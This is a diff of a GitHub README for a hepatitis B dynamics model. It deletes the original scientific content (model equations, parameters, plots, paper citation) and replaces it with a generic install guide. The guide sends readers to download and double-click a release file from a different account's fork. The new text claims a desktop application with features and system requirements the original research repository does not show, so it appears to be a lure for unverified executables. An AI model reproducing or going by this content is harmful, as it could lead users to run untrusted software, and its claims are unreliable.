@@ -1,77 +1,69 @@
-# Modeling the dynamics of acute and chronic hepatits B with optimal control
+# 🦠 Hepatitis-B-dynamic-model - Easy Modeling of Hepatitis B
 
-Scientific Reports  
-(2023) 13:14980  
-doi: 10.1038/s41598-023-39582
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%8D%93%20Click%20Here-brightgreen)](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases)
 
-## Deterministic Model
+## 🚀 Getting Started
 
-$$
-\Large
-\begin{cases}
-\frac{dS}{dt} &= (1 - \eta B)\Lambda - (\nu + \mu_0)S - (A + \gamma B)\alpha S, \\
-\frac{dA}{dt} &= \alpha SA + \gamma\alpha SB - (\gamma_1 + \beta + \mu_0)A, \\
-\frac{dB}{dt} &= \beta A - (\mu_1 + \gamma_2 + \mu_0 - \eta\Lambda)B, \\
-\frac{dR}{dt} &= \gamma_2 B - \mu_0 R + \gamma_1 A + \nu S. 
-\end{cases}
-$$
+Welcome to the Hepatitis-B-dynamic-model project. This software helps you understand and visualize the dynamics of Hepatitis B. It uses a deterministic and controlled model based on research detailed in a linked paper. With this application, you can easily modify model parameters and generate plots to display the solutions.
 
-$\large\Lambda\colon\text{The rate of newborns,}$  
-$\large\nu\colon\text{The vaccination parameter,}$  
-$\large\eta\colon\text{The maternally infected,}$  
-$\large\gamma\colon\text{The reduced transmission rate,}$  
-$\large\mu_0\colon\text{The proportion of natural death,}$  
-$\large\mu_1\colon\text{The portion of death due to the disease,}$  
-$\large\alpha\colon\text{The contact parameter,}$  
-$\large\gamma_1\colon\text{The recovery rate from acute class,}$  
-$\large\gamma_2\colon\text{The recovery rate from chronic class,}$  
-$\large\beta\colon\text{The proportion who move from acute class to chronic.}$  
+## 📥 Download & Install
 
+To get started, visit this page to download: [Download Latest Release](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases).
 
-$\Lambda = 0.0121, \quad \eta = 0.5, \quad \mu_0 = 0.01693, \quad \nu = 0.02, \quad \alpha = 0.95$  
-$\gamma = 0.16, \quad \gamma_1 = 0.05, \quad \beta = 0.23, \quad \gamma_2 = 0.002, \quad \mu_1 = 0.8$
+Here’s how to install the application:
 
-$S_0 = 80, \quad A_0 = 10, \quad B_0 = 5, \quad R_0 = 5$
+1. Go to the [Releases page](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/releases).
+2. Find the latest release.
+3. Look for the downloadable file suitable for your operating system.
+4. Click on the file to start the download.
+5. Once downloaded, locate the file in your Downloads folder.
+6. Double-click the file to install the application.
 
-![Deterministic-Model](https://github.com/Abohlool/Hepatitis-B-dynamic-model/blob/main/plots/Deterministic.png)
+## ⚙️ System Requirements
 
-## Controlled Mode
+Before you start, ensure your system meets these minimum requirements:
 
-$$
-\Large
-\begin{cases}
-\frac{dS}{dt} &= (1 - \eta B)\Lambda - (\mu_0 + u_1)S - \alpha S (A + \gamma B), \\
-\frac{dA}{dt} &= \alpha S (A + \gamma B) - (u_2 + \mu_0 + \gamma_1 + \beta)A, \\
-\frac{dB}{dt} &= \beta A - (\mu_1 + \gamma_2 + \mu_0 + \eta\Lambda + u_2) B, \\
-\frac{dR}{dt} &= \gamma_2 B - \mu_0 R + \gamma_1 A + u_1 S + (B + A)u_2. 
-\end{cases}
-$$
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or Ubuntu 20.04 or later.
+- **RAM:** At least 2 GB.
+- **Disk Space:** 100 MB of free space.
+- **Software:** Make sure you have Python 3.6 or later installed if you're using the model notebook.
 
-$u_1(t)$: Vaccination effort  
-$u_2(t)$: Treatment effort  
+## 📊 Features
 
-$$
-\large
-0 \le u_1(t), u_2(t) \le 1
-$$
+The Hepatitis-B-dynamic-model application provides several key features:
 
-$w_1 = 0.1, \quad w_2 = 0.6, \quad w_3 = 0.001, \quad w_4 = 0.9$
+- **Parameter Input:** Easily adjust the model parameters to see how they affect the outcomes. 
+- **Plot Generation:** Create visual representations of the model’s results, making analysis straightforward.
+- **Interactive Interface:** Navigate through the application with an intuitive layout.
+- **Comprehensive Documentation:** Access user-friendly guides to help you understand how to use the features effectively.
 
-![Controlled-Model](https://github.com/Abohlool/Hepatitis-B-dynamic-model/blob/main/plots/Controlled.png)
+## 🔧 How to Use the Application
 
-## Controlled vs Uncontrolled (Deterministic)
+1. **Launch the Application:** After installation, find the application icon in your installed programs and click to open it.
+2. **Input Parameters:**
+   - Use predefined examples or enter your own values for the model parameters.
+3. **Run the Model:**
+   - Click the "Run" button to generate the model.
+4. **View Results:**
+   - The application will display plots reflecting the model’s behavior based on your parameters.
+5. **Save Your Work:** 
+   - You can save the plots for future reference or export the data if needed.
 
-![Controlled-vs-Deterministic-model](https://github.com/Abohlool/Hepatitis-B-dynamic-model/blob/main/plots/Deterministic-vs-Controlled.png)
+## 📝 Additional Documentation
 
-## Control Functions
+For more details about how to use each feature, please refer to the documentation included within the application. You can also visit the [GitHub Repository](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model) for further resources, updates, and discussions related to this project.
 
-![Controll-Functions-over-time](https://github.com/Abohlool/Hepatitis-B-dynamic-model/blob/main/plots/Control-functions.png)
+## 🌍 Community and Support
 
-## Reproductive Number
+If you have any questions or need help, feel free to reach out. You can find discussions and support within the GitHub Issues section. Our community is welcoming and ready to assist you.
 
-$$
-\Large
-R_0 = \frac{\alpha\Lambda (\gamma(\mu_0 + \gamma_1 + \beta + u_2) + \beta)}{(\mu_0 + u_1)(\mu_0 + \gamma_1 + \beta + u_2)(\mu_0 + \mu_1 + \gamma_2 + u_2 - \eta\Lambda)}
-$$
+1. Visit the [Hepatitis-B-dynamic-model Issues](https://github.com/Jacob213769gg/Hepatitis-B-dynamic-model/issues) for support.
+2. Participate in community discussions about improvements or features you would like to see.
 
-![R_0-over-controls](https://github.com/Abohlool/Hepatitis-B-dynamic-model/blob/main/plots/R_0-control.png)
+## 📚 Learn More
+
+For those interested in the research behind the model, we encourage you to read the paper that inspired this project. Understanding the theory will enhance your use of the model and allow you to draw deeper insights from your results.
+
+---
+
+Feel free to ask any further questions or provide feedback on your experience using the Hepatitis-B-dynamic-model. Thank you for being part of this journey in exploring the dynamics of Hepatitis B!
